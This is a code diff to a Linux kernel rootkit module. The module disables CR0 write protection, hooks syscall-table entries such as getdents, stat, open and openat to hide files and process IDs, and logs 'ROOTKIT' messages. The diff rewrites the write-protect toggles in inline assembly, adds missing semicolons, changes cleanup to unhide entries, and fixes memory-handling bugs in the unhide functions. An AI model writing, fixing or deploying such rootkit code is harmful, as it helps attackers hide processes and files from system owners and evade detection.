@@ -14,8 +14,20 @@
 #include "hooks.h"
 #include "config.h"
 
-#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
-#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));
+#define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "=m" (__force_order));
+
+void ENABLE_WRITE(void){
+	unsigned long val = read_cr0() & (~(1<<16));
+	write_cr0(val)
+}
+void DISABLE_WRITE(void){
+	unsigned long val = read_cr0() | (1<<16);
+	write_cr0(val)
+}
+
+
+//#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
+//#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));
 
 struct list_head list_files = LIST_HEAD_INIT(list_files);
 struct list_head list_pids = LIST_HEAD_INIT(list_pids);
@@ -271,7 +283,7 @@ int __init hooks_init(void){
 	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
 	printk(KERN_INFO "ROOTKIT: Starting hooks\n");
 
-	ENABLE_WRITE() //there must be a way to do this better
+	ENABLE_WRITE(); //there must be a way to do this better
 	perform_hook(getdents, GETDENTS)
 	perform_hook(getdents64, GETDENTS64)
 	perform_hook(stat, STAT)
@@ -280,7 +292,7 @@ int __init hooks_init(void){
 	perform_hook(getpriority, GETPRIORITY)
 	perform_hook(open, OPEN)
 	perform_hook(openat, OPENAT)
-	DISABLE_WRITE()
+	DISABLE_WRITE();
 
 	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
 	return 0;
@@ -288,7 +300,7 @@ int __init hooks_init(void){
 
 
 void __exit hooks_exit(void){
-	ENABLE_WRITE()
+	ENABLE_WRITE();
 	disable_hook(getdents, GETDENTS)
 	disable_hook(getdents64, GETDENTS64)
 	disable_hook(stat, STAT)
@@ -297,19 +309,16 @@ void __exit hooks_exit(void){
 	disable_hook(getpriority, GETPRIORITY)
 	disable_hook(open, OPEN)
 	disable_hook(openat, OPENAT)
-	DISABLE_WRITE()
+	DISABLE_WRITE();
 
 	// delete lists
 	struct list_files_node *node_file, *tmp_file;
 	struct list_pids_node *node_pid, *tmp_pid;
 	list_for_each_entry_safe(node_file, tmp_file, &list_files, list){
-		list_del(&node_file->list);
-		kfree(node_file->name);
-		kfree(node_file);
+		unhide_file(node_file->name);
 	}
 	list_for_each_entry_safe(node_pid, tmp_pid, &list_pids, list){
-		list_del(&node_pid->list);
-		kfree(node_pid);
+		unhide_pid(node_pid->pid);
 	}
 }
 
@@ -338,10 +347,10 @@ int unhide_file(const char* name){
 	struct list_files_node *node, *tmp;
 	list_for_each_entry_safe(node, tmp, &list_files, list){
 		if (strcmp(node->name, name) == 0){
+			printk(KERN_INFO "ROOTKIT: Unhidden file %s\n", name);
 			list_del(&node->list);
 			kfree(node->name);
 			kfree(node);
-			printk(KERN_INFO "ROOTKIT: Unhidden file %s\n", name);
 			return 0;
 		}
 	}
@@ -367,8 +376,9 @@ int unhide_pid(int pid){
 	struct list_pids_node *node, *tmp;
 	list_for_each_entry_safe(node, tmp, &list_pids, list){
 		if (node->pid == pid){
-			list_del(&node->list);
 			printk(KERN_INFO "ROOTKIT: Unhidden PID %d\n", pid);
+			list_del(&node->list);
+			kfree(node);
 			return 0;
 		}
 	}
